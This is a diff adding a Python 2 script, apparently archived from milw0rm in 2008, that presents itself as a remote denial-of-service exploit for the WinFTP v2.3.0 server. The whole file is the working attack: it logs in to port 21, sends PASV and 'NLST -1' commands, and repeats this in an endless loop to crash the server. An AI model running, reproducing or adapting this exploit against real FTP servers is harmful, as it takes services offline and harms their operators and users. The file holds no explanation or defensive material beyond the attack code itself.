@@ -1,0 +1,59 @@
+# WinFTP v2.3.0 DoS exploit
+# WinFTP URL - http://www.wftpserver.com/
+# DoS'ed when try to send data
+# (x)dmnt
+# -*- coding: windows-1252 -*-
+
+import socket
+import time
+import sys
+
+PORT = 21
+
+def help_info():
+    print ("Usage: winftp <host> <login> <password>\n")
+    print ("Note: anonymous is enought\n")
+
+def conn(hostname, username, passwd):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect((hostname, PORT))
+    except:
+        print ("[+] Done!")
+        sys.exit(1)
+
+    r=sock.recv(1024)
+    print "[+] " + r
+    sock.send("USER %s\n" %username)
+    sock.send("PASS %s\n" %passwd)
+    sock.send("PASV\n")
+    sock.send("NLST -1\n")
+    sock.send("QUIT\n")
+    sock.close()
+
+
+print ("\n[WinFTP v2.3.0 remote DoS exploit]")
+print ("[(x)dmnt 2008 without any clue :)]\n\n")
+
+if len(sys.argv) <> 4:
+    help_info()
+    sys.exit(1)
+
+else:
+    hostname=sys.argv[1]
+    username=sys.argv[2]
+    passwd=sys.argv[3]
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try: sock.connect((hostname, PORT))
+    except:
+        print ("[-] Connection error!")
+        sock.close()
+        sys.exit(1)
+
+    while passwd:
+        conn(hostname, username, passwd)
+        time.sleep(0.2)
+
+    sys.exit(0)
+
+# milw0rm.com [2008-10-09]
